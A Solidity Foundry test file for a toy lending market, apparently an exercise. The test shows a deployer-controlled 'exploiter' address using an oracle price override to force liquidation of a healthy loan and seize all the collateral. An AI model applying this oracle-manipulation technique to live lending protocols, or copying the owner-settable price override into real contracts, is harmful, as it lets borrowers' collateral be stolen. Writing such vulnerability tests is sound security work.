// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Blemflarck.sol";
import "../Jungfrau.sol";
import "../BFKLoanMarket.sol";

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "./mocks/MockPriceOracle.sol";

contract BFKLoanMarketTest is Test {
    Blemflarck public blemflarck;
    Jungfrau public jungfrau;
    MockPriceOracle public priceOracle;

    BFKLoanMarket public bfkLoanMarket;

    uint256 public constant AMOUNT = 42 * 10**18;

    function setUp() public {
        address exploiter = 0x08A2DE6F3528319123b25935C92888B16db8913E;

        vm.startPrank(exploiter);

        priceOracle = new MockPriceOracle();
        blemflarck = new Blemflarck();
        jungfrau = new Jungfrau();

        bfkLoanMarket = new BFKLoanMarket(
            address(blemflarck),
            address(jungfrau),
            address(priceOracle)
        );

        priceOracle.setPrice(1 * 10**8);

        // Fund this test contract with blemflarck as collateral
        blemflarck.mint(address(this), AMOUNT);

        // Fund the bfkLoanMarket with loanable jungfrau
        jungfrau.mint(address(bfkLoanMarket), AMOUNT * 2);

        // Fund the liquidator with jungfrau
        jungfrau.mint(exploiter, AMOUNT);
        jungfrau.mint(msg.sender, AMOUNT);
        jungfrau.mint(address(this), AMOUNT);

        vm.stopPrank();
    }

    function testLoansAndAttack() public {
        assertEq(blemflarck.balanceOf(address(this)), AMOUNT);

        // Approve the loan contract to move the test contract's funds
        blemflarck.approve(address(bfkLoanMarket), AMOUNT);

        // Take a loan against all of the owned blemflarck (150% collateral)
        bfkLoanMarket.loan(AMOUNT);

        // Test that the test contract has 0 blemflarck and around 66% jungfrau
        assertEq(blemflarck.balanceOf(address(this)), 0);

        // Should not be able to liquidate the loan at this point
        vm.expectRevert("Loan still valid");
        bfkLoanMarket.liquidate(address(this), msg.sender, AMOUNT / 3);

        address exploiter = 0x08A2DE6F3528319123b25935C92888B16db8913E;

        vm.startPrank(exploiter);
        // Should be able to liquidate by updating the oracle override
        bfkLoanMarket.updatePrice(1);

        // Approve the loan contract to move the liquidator's funds
        jungfrau.approve(address(bfkLoanMarket), AMOUNT / 3);
        bfkLoanMarket.liquidate(address(this), exploiter, AMOUNT / 3);
        vm.stopPrank();

        assertEq(blemflarck.balanceOf(exploiter), AMOUNT);
    }
}
